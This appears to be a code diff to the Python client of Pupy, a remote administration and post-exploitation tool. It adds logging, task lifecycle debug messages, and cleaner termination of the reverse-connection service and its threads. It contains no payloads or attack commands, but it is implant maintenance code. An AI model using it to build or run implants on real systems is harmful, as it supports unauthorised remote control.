@@ -54,8 +54,10 @@ socket.setdefaulttimeout(60)
 import logging
 
 logging.basicConfig()
-logger = logging.getLogger('pp')
-logger.setLevel(logging.WARNING)
+root_logger = logging.getLogger()
+root_logger.setLevel(logging.WARNING)
+
+logger = root_logger.getChild('pp')
 
 from rpyc.core.service import Service, ModuleNamespace
 from rpyc.lib.compat import execute
@@ -293,6 +295,7 @@ class Task(threading.Thread):
 
     def __init__(self, manager, *args, **kwargs):
         threading.Thread.__init__(self)
+
         self.daemon = True
         self._pstore = manager.pstore
         self._stopped = threading.Event()
@@ -300,6 +303,8 @@ class Task(threading.Thread):
             self._pstore[self] = self.results_type()
         self._manager = manager
         self._dirty = False
+
+        logger.debug('Create task %s', self.__class__.__name__)
 
     @property
     def name(self):
@@ -328,16 +333,21 @@ class Task(threading.Thread):
         self._dirty = True
 
     def stop(self):
+        logger.debug('Stopping task %s', self.__class__.__name__)
+
         if self._stopped and self.active:
             self._stopped.set()
 
     def run(self):
+        logger.debug('Task %s started', self.__class__.__name__)
         try:
             self.task()
         except:
             print_exception('[T/R:{}]'.format(self.name))
             if self._stopped:
                 self._stopped.set()
+        finally:
+            logger.debug('Task %s completed', self.__class__.__name__)
 
     @property
     def active(self):
@@ -510,6 +520,9 @@ class ReverseSlaveService(Service):
         )
 
     def on_disconnect(self):
+        if sys.terminated:
+            return
+
         for cleanup in self.exposed_cleanups:
             try:
                 cleanup()
@@ -536,6 +549,12 @@ class ReverseSlaveService(Service):
 
 
     def exposed_exit(self):
+        logger.debug('TERMINATION REQUEST')
+
+        if hasattr(pupy, 'manager'):
+            logger.debug('Send termination event to all tasks')
+            pupy.manager.event(Manager.TERMINATE)
+
         sys.terminated = True
 
         if self._conn:
@@ -543,6 +562,11 @@ class ReverseSlaveService(Service):
 
         if sys.terminate:
             sys.terminate()
+
+        for thread in threading.enumerate():
+            if not thread.daemon:
+                logger.debug('Non daemon thread: %s', thread)
+
 
     def exposed_register_cleanup(self, method):
         self.exposed_cleanups.append(method)
@@ -764,25 +788,28 @@ def main():
     if debug:
         import tempfile
 
-        root_logger = logging.getLogger()
         root_logger.handlers = []
 
         log_file_path = os.path.join(
-            tempfile.mkdtemp(),
+            tempfile.mkdtemp(prefix='pupy-'),
             'pupy-client-{}-{}-debug.log'.format(int(time.time()), os.getpid()))
 
         pupy.infos['debug_logfile'] = log_file_path
 
         log_to_file = logging.FileHandler(log_file_path)
+        log_to_file.setLevel(logging.DEBUG)
         log_to_file.setFormatter(
             logging.Formatter(
                 '%(asctime)-15s|%(levelname)-5s|%(relativeCreated)6d|%(threadName)s|%(name)s| %(message)s'))
         log_to_con = logging.StreamHandler()
+        log_to_con.setLevel(logging.DEBUG)
         log_to_con.setFormatter(logging.Formatter('%(asctime)-15s| %(message)s'))
 
         root_logger.addHandler(log_to_file)
         root_logger.addHandler(log_to_con)
         root_logger.setLevel(logging.DEBUG)
+
+        root_logger.info('\nLogFile: %s\n', log_file_path)
 
     launcher = conf.launchers[LAUNCHER]()
 
@@ -898,8 +925,15 @@ def rpyc_loop(launcher):
                 except:
                     pass
 
+        if sys.terminated:
+            break
+
 if __name__ == "__main__":
     main()
+
+    if __debug__:
+        for thread in threading.enumerate():
+            print "> ALIVE:", thread, thread.daemon
 else:
     if not platform.system() == 'android':
         if not hasattr(platform, 'pupy_thread'):
